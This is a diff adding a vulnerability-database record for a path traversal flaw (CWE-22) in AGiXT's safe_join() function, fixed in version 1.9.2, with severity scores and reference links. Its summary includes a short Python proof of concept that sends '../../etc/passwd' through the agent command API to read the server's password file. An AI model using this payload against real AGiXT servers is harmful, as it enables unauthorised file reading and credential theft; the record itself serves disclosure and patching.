@@ -1,0 +1,50 @@
+advisory_id: GHSA-5gfj-64gh-mgmw
+datasource_id: github_osv_importer_v2/GHSA-5gfj-64gh-mgmw
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-5gfj-64gh-mgmw/GHSA-5gfj-64gh-mgmw.json
+aliases: []
+summary: "AGiXT Vulnerable to Path Traversal in safe_join()\n### Summary\nThe safe_join() function\
+  \ in the essential_abilities extension fails to validate that resolved file paths remain within\
+  \ the designated agent workspace. An authenticated attacker can use directory traversal sequences\
+  \ to read, write, or delete arbitrary files on the server hosting the AGiXT instance.\n\n\
+  ### Details\n`agixt/endpoints/Extension.py:165` (source) -> `agixt/XT.py:1035` (hop) -> `agixt/extensions/essential_abilities.py:436`\
+  \ (sink)\n\n```python\n# source\ncommand_args = command.command_args\n\n# hop\nresponse =\
+  \ await Extensions(...).execute_command(command_name=command_name, command_args=command_args)\n\
+  \n# sink\nnew_path = os.path.normpath(os.path.join(self.WORKING_DIRECTORY, *paths.split(\"\
+  /\")))\n```\n### PoC\n \n```python\n# tested on: agixt<=1.9.1\n# install: pip install agixt==1.9.1\n\
+  \ \nimport requests\n \nBASE = \"http://localhost:7437\"\nTOKEN = \"<your_api_key>\"\n \n\
+  headers = {\"Authorization\": f\"Bearer {TOKEN}\"}\n \npayload = {\n    \"command_name\":\
+  \ \"read_file\",\n    \"command_args\": {\n        \"filename\": \"../../etc/passwd\"\n  \
+  \  }\n}\n \nr = requests.post(f\"{BASE}/api/agent/MyAgent/command\", json=payload, headers=headers)\n\
+  print(r.text)\n# expected output: root:x:0:0:root:/root:/bin/bash ...\n```\n \n### Impact\n\
+  \ \nAuthenticated users can read, overwrite, or delete arbitrary files on the host server,\
+  \ enabling credential theft, persistent code execution, or denial of service. Authentication\
+  \ is required but no elevated privileges are needed beyond a valid API key."
+impacted_packages:
+  - purl: pkg:pypi/agixt
+    affected_versions: vers:pypi/<=1.9.1
+    fixed_versions: vers:pypi/1.9.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-5gfj-64gh-mgmw/GHSA-5gfj-64gh-mgmw.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/Josh-XT/AGiXT
+    reference_type:
+    reference_id:
+  - url: https://github.com/Josh-XT/AGiXT/releases/tag/v1.9.2
+    reference_type:
+    reference_id:
+  - url: https://github.com/Josh-XT/AGiXT/security/advisories/GHSA-5gfj-64gh-mgmw
+    reference_type:
+    reference_id:
